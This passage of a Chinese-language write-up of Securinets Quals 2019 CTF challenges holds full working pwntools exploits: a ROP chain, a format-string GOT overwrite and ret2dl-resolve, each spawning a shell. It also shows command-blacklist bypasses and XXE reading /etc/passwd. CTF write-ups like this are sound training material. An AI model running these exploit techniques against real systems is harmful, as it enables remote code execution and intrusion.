class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">setreuid(geteuid(),geteuid());</span><br><span class="line">close(<span class="number">0</span>);</span><br><span class="line">system(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们需要做的就是想办法绕过 blacklist，然后。基础绕过方式：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">welcome@vps614257:~$ ./wrapper</span><br><span class="line">Welcome to Securinets Quals CTF o/</span><br><span class="line">Enter string:</span><br><span class="line">catccat flagfflag.txtttxt</span><br><span class="line">securinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125;</span><br></pre></td></tr></table></figure>
-<p>进阶绕过方式，利用<code>*</code>通配：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">welcome@vps614257:~$ ./wrapper</span><br><span class="line">Welcome to Securinets Quals CTF o/</span><br><span class="line">Enter string:</span><br><span class="line">/bin/ca* fla*</span><br><span class="line">securinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125;</span><br></pre></td></tr></table></figure>
-<p>高级绕过方式，sed 正则匹配：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">welcome@vps614257:~$ ./wrapper</span><br><span class="line">Welcome to Securinets Quals CTF o/</span><br><span class="line">Enter string:</span><br><span class="line">sed <span class="string">''</span> fla*</span><br><span class="line">securinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125;</span><br></pre></td></tr></table></figure>
-<p><a href="https://github.com/AnisBoss/CTFs/tree/master/Securinets-CTF-QUALS-2019/welcome" target="_blank" rel="noopener">官方给的 wp</a>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">welcome@vps614257:~$ ./wrapper</span><br><span class="line">Welcome to Securinets Quals CTF o/</span><br><span class="line">Enter string:</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 ./welcome</span><br><span class="line">securinets&#123;who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Baby-one"><a href="#Baby-one" class="headerlink" title="Baby one"></a>Baby one</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./baby1</span><br><span class="line">[*] &apos;/Users/qianfei/Desktop/baby1&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-<p>ida 反编译出 main 函数：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Welcome to securinets Quals!\n"</span>, <span class="number">0x1D</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x12C</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>简单的 rop，利用__libc_csu_init 来 call 函数，达到泄漏和 getshell。Exploit：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./baby1'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'51.254.114.246'</span>, <span class="number">1111</span>)</span><br><span class="line">elf = ELF(<span class="string">'./baby1'</span>)</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">buf = <span class="number">0x0602000</span><span class="number">-0x100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  4006a0:       4c 89 ea                mov    rdx,r13</span></span><br><span class="line"><span class="comment">#  4006a3:       4c 89 f6                mov    rsi,r14</span></span><br><span class="line"><span class="comment">#  4006a6:       44 89 ff                mov    edi,r15d</span></span><br><span class="line"><span class="comment">#  4006a9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]</span></span><br><span class="line"><span class="comment">#  4006ad:       48 83 c3 01             add    rbx,0x1</span></span><br><span class="line"><span class="comment">#  4006b1:       48 39 eb                cmp    rbx,rbp</span></span><br><span class="line"><span class="comment">#  4006b4:       75 ea                   jne    4006a0 &lt;__libc_csu_init+0x40&gt;</span></span><br><span class="line"><span class="comment">#  4006b6:       48 83 c4 08             add    rsp,0x8</span></span><br><span class="line"><span class="comment">#  4006ba:       5b                      pop    rbx</span></span><br><span class="line"><span class="comment">#  4006bb:       5d                      pop    rbp</span></span><br><span class="line"><span class="comment">#  4006bc:       41 5c                   pop    r12</span></span><br><span class="line"><span class="comment">#  4006be:       41 5d                   pop    r13</span></span><br><span class="line"><span class="comment">#  4006c0:       41 5e                   pop    r14</span></span><br><span class="line"><span class="comment">#  4006c2:       41 5f                   pop    r15</span></span><br><span class="line"><span class="comment">#  4006c4:       c3                      ret</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, addr)</span>:</span></span><br><span class="line">	payload = <span class="string">'\x00'</span> * <span class="number">56</span> + p64(<span class="number">0x4006ba</span>) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(<span class="number">0x4006a0</span>) + <span class="string">'\x00'</span> * <span class="number">56</span> + p64(addr)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = cyclic(500)</span></span><br><span class="line">offset = <span class="number">56</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main)</span><br><span class="line">write = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'write = '</span> + hex(write))</span><br><span class="line">write_offset = <span class="number">0x0f72b0</span></span><br><span class="line">libc_base = write - write_offset</span><br><span class="line">success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">execve = libc_base + <span class="number">0x0000000000cc770</span></span><br><span class="line">system = libc_base + <span class="number">0x045390</span></span><br><span class="line">str_bin_sh = libc_base + <span class="number">0x18cd57</span></span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">16</span>, buf, <span class="number">0</span>, main)</span><br><span class="line">p.send(p64(execve) + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, buf, <span class="number">0</span>, <span class="number">0</span>, buf + <span class="number">8</span>, main)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="Simple"><a href="#Simple" class="headerlink" title="Simple"></a>Simple</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@91120f278fdd:~/ctf/2019-Securinets/pwn/Simple<span class="comment"># checksec ./simple</span></span><br><span class="line">[*] <span class="string">'/root/ctf/2019-Securinets/pwn/Simple/simple'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-<p>ida 反编译 main 函数：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x3F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  perror(<span class="string">"hemm okay\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在 printf 处可以看到格式化字符串漏洞，基本上这道题目就是多次利用了这个漏洞。第一次我们通过格式化字符串泄漏出 libc 的地址等相关信息，同时将 perror 的 got 表改成 main。第二次把 one_gadget 填到 ret 的地址上。第三次把 perror 的 got 表改回去，然后程序会直接 ret 到 one_gadget。Exploit：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./simple'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	one_gadget_offset = <span class="number">0x4f322</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'51.254.114.246'</span>, <span class="number">4444</span>)</span><br><span class="line">	libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">	one_gadget_offset = <span class="number">0x4526a</span></span><br><span class="line">elf = ELF(<span class="string">'./simple'</span>)</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">perror_got = elf.got[<span class="string">'perror'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%14$p%10$s%1682c%9$hn'</span></span><br><span class="line">payload += <span class="string">'\x00'</span> * (<span class="number">24</span> - len(payload))</span><br><span class="line">payload += p64(perror_got)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak = p.recv()</span><br><span class="line">offset = <span class="number">0xd8</span></span><br><span class="line">ret = int(leak[<span class="number">0</span>:<span class="number">14</span>], <span class="number">16</span>) - offset</span><br><span class="line"></span><br><span class="line">read = u64(leak[<span class="number">14</span>:<span class="number">20</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'read = '</span> + hex(read))</span><br><span class="line">libc_base = read - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line">a0 = one_gadget &amp; <span class="number">0xffff</span></span><br><span class="line">a1 = ((one_gadget &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span>)</span><br><span class="line">a1 = (a1 - a0 - <span class="number">1</span>) % <span class="number">0x10000</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(a0, <span class="number">10</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(a1, <span class="number">11</span>)</span><br><span class="line">payload += <span class="string">'\x00'</span> * (<span class="number">32</span> - len(payload))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(ret + <span class="number">2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%1430c%8$hn'</span></span><br><span class="line">payload += <span class="string">'\x00'</span> * (<span class="number">16</span> - len(payload))</span><br><span class="line">payload += p64(perror_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="Baby-Two"><a href="#Baby-Two" class="headerlink" title="Baby Two"></a>Baby Two</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./baby2</span><br><span class="line">[*] <span class="string">'/Users/qianfei/ctf/ctf/2019-Securinets/pwn/Baby-Two/baby2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<p>ida 反编译 main 函数：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-30h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x12C</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>只有一个<code>read</code>，直接上<code>ret2dl-resolve</code>一把梭，以下是<a href="https://github.com/ptr-yudai" target="_blank" rel="noopener">Yudai 大佬</a>的 exp，用到了大佬写的库<a href="https://bitbucket.org/ptr-yudai/ptrlib/src/master/" target="_blank" rel="noopener">ptrlib</a>：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> ptrlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./baby2'</span>)</span><br><span class="line"></span><br><span class="line">addr_plt = <span class="number">0x08048320</span></span><br><span class="line">addr_start = elf.symbol(<span class="string">'_start'</span>)</span><br><span class="line"></span><br><span class="line">addr_relplt = elf.section(<span class="string">'.rel.plt'</span>)</span><br><span class="line">addr_dynsym = elf.section(<span class="string">'.dynsym'</span>)</span><br><span class="line">addr_dynstr = elf.section(<span class="string">'.dynstr'</span>)</span><br><span class="line">addr_bss    = elf.section(<span class="string">'.bss'</span>)</span><br><span class="line"></span><br><span class="line">rop_pop3 = <span class="number">0x08048509</span></span><br><span class="line">rop_ret = <span class="number">0x080482fa</span></span><br><span class="line"></span><br><span class="line">fname = <span class="string">'system\x00'</span></span><br><span class="line">farg  = <span class="string">'/bin/sh\x00'</span></span><br><span class="line"></span><br><span class="line">plt_read = <span class="number">0x08048330</span></span><br><span class="line">base_stage = addr_bss + <span class="number">0x800</span></span><br><span class="line">addr_reloc = addr_bss + <span class="number">0xa00</span></span><br><span class="line">addr_sym   = addr_bss + <span class="number">0xa80</span> | (addr_dynsym &amp; <span class="number">0xF</span>)</span><br><span class="line">addr_str   = addr_bss + <span class="number">8</span></span><br><span class="line">addr_arg   = addr_str + len(fname)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Elf32_Rel</span></span><br><span class="line">reloc = p32(elf.got(<span class="string">'setvbuf'</span>))</span><br><span class="line">reloc += p32((((addr_sym - addr_dynsym) // <span class="number">0x10</span>) &lt;&lt; <span class="number">8</span>) | <span class="number">7</span>)</span><br><span class="line"><span class="comment"># Elf32_Sym</span></span><br><span class="line">sym = p32(addr_str - addr_dynstr)</span><br><span class="line">sym += p32(<span class="number">0</span>)</span><br><span class="line">sym += p32(<span class="number">0</span>)</span><br><span class="line">sym += p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">craft_read</span><span class="params">(addr, size)</span>:</span></span><br><span class="line">    payload = p32(plt_read)</span><br><span class="line">    payload += p32(rop_pop3)</span><br><span class="line">    payload += p32(<span class="number">0</span>)    <span class="comment"># fd</span></span><br><span class="line">    payload += p32(addr) <span class="comment"># buf</span></span><br><span class="line">    payload += p32(size) <span class="comment"># size</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># ncat -vc ./baby2 -kl 8888</span></span><br><span class="line">sock = Socket(<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="comment"># sock = Socket('51.254.114.246', 2222)</span></span><br><span class="line"></span><br><span class="line"><span class="string">''' Stage 1 (probabilistic write) '''</span></span><br><span class="line">payload1 = <span class="string">b''</span></span><br><span class="line">payload1 += p32(rop_ret) * ((<span class="number">0x2c</span> - <span class="number">6</span> * <span class="number">4</span>) // <span class="number">4</span>)</span><br><span class="line">payload1 += craft_read(base_stage, <span class="number">0x100</span>) <span class="comment"># 5 * 4</span></span><br><span class="line">payload1 += p32(addr_start)               <span class="comment"># 4</span></span><br><span class="line">payload1 += bytes([<span class="number">0x20</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">''' Stage 2 (stack pivot) '''</span></span><br><span class="line">payload2 = <span class="string">b'A'</span> * <span class="number">0x2c</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">4</span>)</span><br><span class="line">payload2 += <span class="string">b'\x00'</span> * (<span class="number">0x12c</span> - len(payload2))</span><br><span class="line"></span><br><span class="line"><span class="string">''' Stage 3 (craft) '''</span></span><br><span class="line">reloc_offset = addr_reloc - addr_relplt</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b''</span></span><br><span class="line">payload3 += craft_read(addr_reloc, <span class="number">0x8</span>)</span><br><span class="line">payload3 += craft_read(addr_sym, <span class="number">0x10</span>)</span><br><span class="line">payload3 += craft_read(addr_str, len(fname))</span><br><span class="line">payload3 += craft_read(addr_arg, len(farg))</span><br><span class="line">payload3 += p32(addr_plt)</span><br><span class="line">payload3 += p32(reloc_offset)</span><br><span class="line">payload3 += <span class="string">b'XXXX'</span></span><br><span class="line">payload3 += p32(addr_arg)</span><br><span class="line">payload3 += <span class="string">b'\x00'</span> * (<span class="number">0x100</span> - len(payload3))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 1</span></span><br><span class="line">sock.send(payload1)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">sock.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2</span></span><br><span class="line">sock.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 3</span></span><br><span class="line">sock.send(reloc)</span><br><span class="line">sock.send(sym)</span><br><span class="line">sock.send(fname)</span><br><span class="line">sock.send(farg)</span><br><span class="line"></span><br><span class="line">sock.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Feedback"><a href="#Feedback" class="headerlink" title="Feedback"></a>Feedback</h2><p>这是一道<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank" rel="noopener">XXE</a>_Processing&gt;)，通过 burpsuite 抓包，然后直接利用<a href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection" target="_blank" rel="noopener">网上的 exp</a>看到：</p>
-<p><img src="/pics/2019-Securinets-CTF-Quals/4.png" alt="远程服务器上的/etc/passwd文件"></p>
-<p>然后同理，看到有 simple_user 这个用户，尝试看看能不能在家目录拿到 flag：</p>
-<p><img src="/pics/2019-Securinets-CTF-Quals/5.png" alt="尝试simple_user家目录"></p>
-<p>发现没有，再试试 apche 根目录：</p>
-<p><img src="/pics/2019-Securinets-CTF-Quals/6.png" alt="尝试apache根目录"></p>
-<p>还是不行。发现网站是 nginx 搭的，就 google 一下<a href="https://stackoverflow.com/questions/10674867/nginx-default-public-www-location" target="_blank" rel="noopener">nginx 的默认 www 目录</a>：</p>
-<p><img src="/pics/2019-Securinets-CTF-Quals/7.png" alt="查看nginx的默认www目录"></p>
-<p>然后可以看到 root 的路径，尝试获得 flag：</p>
-<p><img src="/pics/2019-Securinets-CTF-Quals/8.png" alt="得到flag"></p>
-<h1 id="Foren"><a href="#Foren" class="headerlink" title="Foren"></a>Foren</h1><h2 id="Easy-Trade"><a href="#Easy-Trade" class="headerlink" title="Easy Trade"></a>Easy Trade</h2><p>用 wireshark 打开给的 pcap 包，总共只有几十条信息，可以一条条看下来。首先可以看到给出的 key：</p>
-<p><img src="/pics/2019-Securinets-CTF-Quals/9.png" alt="give me the key"></p>
-<p><img src="/pics/2019-Securinets-CTF-Quals/10.png" alt="导出key"></p>
-<p>然后再往下看可以找到一个 PK 头的 zip，看得到里面有<code>flag.txt</code>：</p>
-<p><img src="/pics/2019-Securinets-CTF-Quals/11.png" alt="压缩有flag的zip"></p>
-<p>拿到<code>flag.txt</code>的内容后 base64 解密一下拿到 flag：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat data</span></span><br><span class="line">securinetsXD</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> unzip flag.zip</span></span><br><span class="line">Archive:  flag.zip</span><br><span class="line">[flag.zip] flag.txt password:</span><br><span class="line"> extracting: flag.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat flag.txt | base64 -D</span></span><br><span class="line">securinets&#123;954f670cb291ec276b1a9ff8453ea60%</span><br></pre></td></tr></table></figure>
-<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="HIDDEN"><a href="#HIDDEN" class="headerlink" title="HIDDEN"></a>HIDDEN</h2><p>题目提示了在 url 栏中有些不一样的地方。可以看到这个网站用了 http 而不是 https：</p>
-<p><img src="/pics/2019-Securinets-CTF-Quals/12.png" alt="url栏"></p>
-<p>点开后在证书中看到 flag：</p>
-<p><img src="/pics/2019-Securinets-CTF-Quals/13.png" alt="证书中的flag"></p>
-<h2 id="EZ"><a href="#EZ" class="headerlink" title="EZ"></a>EZ</h2><p>图片隐写，<a href="https://stylesuxx.github.io/steganography/" target="_blank" rel="noopener">在线解密一下</a>：</p>
